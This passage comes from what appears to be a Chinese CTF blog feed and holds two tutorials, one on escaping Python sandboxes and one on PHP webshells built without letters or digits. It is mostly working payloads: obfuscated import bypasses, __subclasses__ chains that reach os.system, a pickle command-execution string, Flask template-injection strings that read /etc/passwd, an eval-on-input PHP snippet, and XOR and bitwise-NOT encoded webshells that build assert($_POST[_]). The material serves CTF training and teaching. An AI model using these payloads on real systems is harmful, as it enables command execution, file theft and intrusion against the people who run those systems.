print(&apos;[+]&apos; + result)\n        for r in results[result][&apos;result&apos;]:\n            print(&apos;  [-]&apos; + r + &apos;: &apos; + results[result][&apos;result&apos;][r])</code></pre><p>从结果可以看到有相当大一部分模块都导入了“危险”的函数。只要我们可以 <code>import</code> 那么存在这些模块的环境就是危险的。</p>\n<h3 id=\"如果我们没办法-import-呢？\"><a href=\"#如果我们没办法-import-呢？\" class=\"headerlink\" title=\"如果我们没办法 import 呢？\"></a>如果我们没办法 import 呢？</h3><p>如果只是简单的禁用 <code>import os</code> 我们可以加空格绕过 <code>import   os</code> .</p>\n<p>如果多个空格也过滤了我们还可以 <code>__import__(&#39;os&#39;)</code>.</p>\n<p>如果过滤 os 我们还可以 <code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code>。</p>\n<p>如果这也不行还有 <code>importlib:importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>.</p>\n<p>联想到我们上面说的 <code>__builtin__/__builtins__</code>,一些危险内建函数都可以直接用，如果这些函数都被 del 掉我们可以 <code>reload(__builtin__)</code> 来重载一个完整的 <code>__builtin__</code>.</p>\n<p>reload 也是内建函数，如果这也没了呢？ </p>\n<pre><code>import imp\nimp.reload(__builtin__)</code></pre><p>也可以引入。</p>\n<p>如果 <code>sys.modules[&#39;os&#39;]=None</code> 从根源删除呢？</p>\n<p>实际上联系到 import 的原理</p>\n<blockquote>\n<p>如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>\n</blockquote>\n<p>如果 <code>sys</code> 可以用的话可以先确认一下路径</p>\n<pre><code>import sys\nprint(sys.path)</code></pre><p>本质上是执行一遍导入的库，这个过程可以用 <code>execfile</code> 来代替</p>\n<pre><code>execfile(&apos;/usr/lib/python2.7/os.py&apos;)\nsystem(&apos;ls&apos;)</code></pre><p>3.x 中删除了 execfile ，不过可以这样：</p>\n<pre><code>with open(&apos;/usr/lib/python3.6/os.py&apos;,&apos;r&apos;) as f:\n    exec(f.read())\nsystem(&apos;ls&apos;)</code></pre><p>还有一种方法：当我们使用 del sys.modules[‘os’] 时是不起作用的，因为在import 时会在检测到不存在 os 时重载一次，也就是说我们可以</p>\n<pre><code>sys.modules[&apos;os&apos;] = &apos;not allowed&apos; # oj 为你加的\n\ndel sys.modules[&apos;os&apos;]\nimport os\nos.system(&apos;ls&apos;)</code></pre><h3 id=\"其他一些小技巧\"><a href=\"#其他一些小技巧\" class=\"headerlink\" title=\"其他一些小技巧\"></a>其他一些小技巧</h3><ol>\n<li><p>过滤掉整个匹配语句我们可以使用变量替换的方式</p>\n<p> a = open<br> print(a(“d:/test.txt”).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1…</type></mount></file></p>\n</li>\n<li><p>函数后面加空格、换行都能执行</p>\n</li>\n<li><p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数</p>\n<p> from numpy.distutils.exec_command import _exec_command as system</p>\n<p> system(“ls /“)</p>\n</li>\n<li><p>使用别名</p>\n<p> import os as o</p>\n</li>\n<li><p>字符串拼接</p>\n<p> “l”+”s”</p>\n<p> “func_global”+”s”</p>\n</li>\n<li><p>字符串编码或者其他操作</p>\n<p> ‘X19pbXBvcnRfXw==’.decode(‘base64’) //<strong>import</strong></p>\n<p> <strong>import</strong>(‘so’[::-1]).system(‘ls’)</p>\n<p> eval(‘)”imaohw”(metsys.)”so”(<strong>tropmi</strong>‘[::-1])</p>\n<p> exec(‘)”imaohw”(metsys.so ;so tropmi’[::-1])</p>\n</li>\n</ol>\n<h2 id=\"通过继承关系逃逸\"><a href=\"#通过继承关系逃逸\" class=\"headerlink\" title=\"通过继承关系逃逸\"></a>通过继承关系逃逸</h2><p>通过 Python 的继承关也就是说我们想利用的模块被杀了之后我们想办法构造一条到基类的链然后再自顶向下重新找到一个可行的路来使用目标模块。 </p>\n<p>python 类中有个属性叫 <strong>mro</strong> ,是个元组记录了继承关系。</p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>通过文章最开始的介绍我们也可以通过多次使用 <code>__base__</code> 来找到基类 <code>object</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__\n&lt;type &apos;object&apos;&gt;</code></pre><p>然后从基类向下回溯，使用 <code>__subclasses__</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__\n&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()\n[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>我们发现结果太多了，网上找到 bendawang 师傅的脚本来循环找一下</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in [].__class__.__base__.__subclasses__():\n    try:\n        if &apos;os&apos; in item.__init__.__globals__:\n            print cnt,item\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>利用这个来找到 <code>os</code> 模块的入口</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():\n    try:\n        cnt2=0\n        for i in item.__init__.__globals__:\n            if &apos;eval&apos; in item.__init__.__globals__[i]:\n                print cnt,item,cnt2,i\n            cnt2+=1\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>这个相当于更深入一层查找</p>\n<p>存在的子模块可以通过 .index() 来进行查询，如果存在返回索引</p>\n<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x 版本中有一个 warnings </p>\n<pre><code>&gt;&gt;&gt; import warnings\n&gt;&gt;&gt; warnings.os\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nAttributeError: &apos;module&apos; object has no attribute &apos;os&apos;\n&gt;&gt;&gt; warnings.linecache\n&lt;module &apos;linecache&apos; from &apos;F:\\python2.7\\lib\\linecache.pyc&apos;&gt;\n&gt;&gt;&gt; warnings.linecache.os\n&lt;module &apos;os&apos; from &apos;F:\\python2.7\\lib\\os.pyc&apos;&gt;</code></pre><p>我们可以</p>\n<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>简单的给基类的所有模块编号</p>\n<pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>如何便捷的找到我们想要的入口</p>\n<pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id=\"大佬们的payload\"><a href=\"#大佬们的payload\" class=\"headerlink\" title=\"大佬们的payload\"></a>大佬们的payload</h3><ol>\n<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li>\n<li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li>\n</ol>\n<h3 id=\"过滤中括号\"><a href=\"#过滤中括号\" class=\"headerlink\" title=\"过滤中括号\"></a>过滤中括号</h3><p>如果碰到过滤 <code>[ ]</code> ，我们可以将 <code>[]</code> 的功能用 <code>pop</code> 、 <code>__getitem__</code>代替（实际上 <code>a[0]</code> 在内部就是调用了 <code>a.__getitem__(0)</code> ），<code>pop()</code> 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>\n<pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id=\"过滤引号\"><a href=\"#过滤引号\" class=\"headerlink\" title=\"过滤引号\"></a>过滤引号</h3><p>requests.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 作为变量名将后面的路径传进来，来绕过引号</p>\n<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id=\"过滤双下划线\"><a href=\"#过滤双下划线\" class=\"headerlink\" title=\"过滤双下划线\"></a>过滤双下划线</h3><p>同样利用  requests.args 属性</p>\n<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id=\"过滤关键字\"><a href=\"#过滤关键字\" class=\"headerlink\" title=\"过滤关键字\"></a>过滤关键字</h3><p>除了编码，我们还可以通过字符串拼接</p>\n<p><code>__getattribute__</code> 使用实例访问属性时,调用该方法</p>\n<pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}</code></pre><h2 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h2><ol>\n<li>func_globals</li>\n</ol>\n<p>返回包含函数全局变量的字典的引用-定义函数的模块的全局命名空间</p>\n<ol start=\"2\">\n<li><strong>getattribute</strong></li>\n</ol>\n<p>被调用无条件地实现类的实例的属性访问</p>\n<pre><code>object. getattribute(self, name)\n1）self 必需的。类的实例，在调用时自动传递。\n2）name 必需的。属性的名称。</code></pre><ol start=\"3\">\n<li><strong>subclasses</strong>()[]</li>\n</ol>\n<p>获取子类</p>\n<ol start=\"4\">\n<li>getattr</li>\n</ol>\n<p>返回对象的命名属性的值</p>\n<pre><code>getattr(object,name) &lt;=&gt; object.name\n&gt;&gt;&gt; class A():\n...     bar =1\n...\n\n&gt;&gt;&gt; a = A()\n\n&gt;&gt;&gt; getattr(a,&apos;bar&apos;)\n1</code></pre><ol start=\"5\">\n<li><strong>name</strong></li>\n</ol>\n<p>使用 sys.modules[<strong>name</strong>] 获得模块的引用</p>\n<ol start=\"6\">\n<li><p>timeit</p>\n<p> timeit(命令，number=1)</p>\n<p> import timeit<br> timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1) </p>\n</li>\n<li><p>platform</p>\n</li>\n</ol>\n<p>模块和平台有关，主要是返回平台的一些信息</p>\n<pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start=\"8\">\n<li><strong>globals</strong></li>\n</ol>\n<p>常与 <code>__init__</code> 配合使用，<code>__init__</code> 一般跟在类的后面。相当于实例化这个类</p>\n<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start=\"9\">\n<li><strong>call</strong></li>\n</ol>\n<p>使实例能够像函数一样被调用 <code>x.call() &lt;=&gt; x()</code></p>\n<ol start=\"10\">\n<li>pickle</li>\n</ol>\n<p>将对象储存在字符串对象中，实现对象的持久化</p>\n<p>序列化：</p>\n<pre><code>import pickle\ntest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])\np=pickle.dumps(test)</code></pre><p>反序列化：</p>\n<pre><code>n=pickle.loads(p)</code></pre><p>我们可以加载命令：</p>\n<pre><code>pickle.loads(b&quot;cos\\nsystem\\n(S&apos;ls&apos;\\ntR.&quot;)</code></pre><ol start=\"11\">\n<li><p>os/subprocess/commands</p>\n<p>os.system(‘ipconfig’)<br>os.popen(‘ipconfig’)<br>commands.getoutput(‘ipconfig’)<br>commands.getstatusoutput(‘ifconfig’)<br>subrocess.call([‘ipconfig’],shell=true)</p>\n</li>\n<li><p>eval/exec/execfile</p>\n<p>eval() 执行 python 表达式执行的结果</p>\n<p>exec() 动态执行 python 代码，可以执行复杂的 python 代码，eval 只能计算一个表达式</p>\n<p>execfile() 执行一个文件的内容，文件是将被解析为 python 序列的类似模块的文件</p>\n</li>\n</ol>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/hester/p/4694499.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href=\"https://www.restran.net/2015/10/22/how-python-code-run/\" target=\"_blank\" rel=\"noopener\">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href=\"https://www.freebuf.com/articles/system/203208.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/203208.html</a><br><a href=\"https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href=\"https://www.zhihu.com/question/38791962?sort=created\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/38791962?sort=created</a></p>\n</blockquote>\n","text":"10/11/2019 2:26:44 PM Python 沙箱逃逸你真的看懂了么？python 沙箱逃逸就是在一个被严格限制了 python 执行环境中获取更高的权限，甚至 getshell ,这是我们的最终目的。但是在这之前我们需要绕过各种限制。由于环境中限制了许多敏感模块比如","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"特殊的webshell","slug":"特殊的webshell","date":"2019-09-27T03:26:55.000Z","updated":"2020-05-09T10:22:00.030Z","comments":true,"path":"api/articles/特殊的webshell.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"特殊的webshell\"><a href=\"#特殊的webshell\" class=\"headerlink\" title=\"特殊的webshell\"></a>特殊的webshell</h1><p>实验环境 ：<code>php 5.45+nts+apache</code></p>\n<blockquote>\n<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>\n<p>但 php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>\n</blockquote>\n<h2 id=\"不包含数字字母\"><a href=\"#不包含数字字母\" class=\"headerlink\" title=\"不包含数字字母\"></a>不包含数字字母</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h3><p>异或是对字符的 <code>ascii</code>码进行逐位异或以后得到一个异或结果<code>ascii</code>码的字符。</p>\n<p>第一种方法就是这样来绕过数字字母的检测。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=urldecode(<span class=\"string\">'%01'</span>); <span class=\"comment\">//ascii 0x01</span></span><br><span class=\"line\">$b=urldecode(<span class=\"string\">'`'</span>);   <span class=\"comment\">//ascii 96</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a^$b;\t\t\t <span class=\"comment\">//a</span></span><br><span class=\"line\"><span class=\"number\">96</span>:  <span class=\"number\">0110</span> <span class=\"number\">0000</span></span><br><span class=\"line\">%<span class=\"number\">01</span>: <span class=\"number\">0000</span> <span class=\"number\">0001</span>\t\t <span class=\"comment\">//相当于ascii+1</span></span><br></pre></td></tr></table></figure>\n\n<p>我们统一选取  ‘`’  作为我们异或的起点，因为他的 ascii 是96。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_=(<span class=\"string\">'%01'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%13'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%13'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%05'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%12'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%14'</span>^<span class=\"string\">'`'</span>);</span><br><span class=\"line\">$__=<span class=\"string\">'_'</span>.(<span class=\"string\">'%0D'</span>^<span class=\"string\">']'</span>).(<span class=\"string\">'%2F'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%0E'</span>^<span class=\"string\">']'</span>).(<span class=\"string\">'%09'</span>^<span class=\"string\">']'</span>); <span class=\"comment\">// $__='_POST';</span></span><br><span class=\"line\">$___=$$__;</span><br><span class=\"line\">$_($___[_]); <span class=\"comment\">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>\n\n<p>在如下过滤中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们 <code>POST : _=phpinfo();</code> 即可成功执行</p>\n<h3 id=\"取反\"><a href=\"#取反\" class=\"headerlink\" title=\"取反\"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> ((<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)).<span class=\"string\">' '</span>;<span class=\"comment\">//利用弱类型的特性</span></span><br><span class=\"line\">$__=(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>);</span><br><span class=\"line\">$_=$__/$__;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> ~(<span class=\"string\">'和'</span>&#123;<span class=\"number\">2</span>&#125;);\t          <span class=\"comment\">//s</span></span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$__=(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>); <span class=\"comment\">//2</span></span><br><span class=\"line\">$_=$__/$__; <span class=\"comment\">//1</span></span><br><span class=\"line\"></span><br><span class=\"line\">$____=<span class=\"string\">''</span>; <span class=\"comment\">//assert</span></span><br><span class=\"line\">$___=<span class=\"string\">\"瞰\"</span>;$____.=~($___&#123;$_&#125;); <span class=\"keyword\">echo</span> $____.<span class=\"string\">\"\\r\\n\"</span>;<span class=\"comment\">//a</span></span><br><span class=\"line\">$___=<span class=\"string\">\"和\"</span>;$____.=~($___&#123;$__&#125;); <span class=\"keyword\">echo</span> $____.<span class=\"string\">\"\\r\\n\"</span>; <span class=\"comment\">//s</span></span><br><span class=\"line\">$___=<span class=\"string\">\"和\"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"的\"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"半\"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"始\"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$_____=<span class=\"string\">'_'</span>;<span 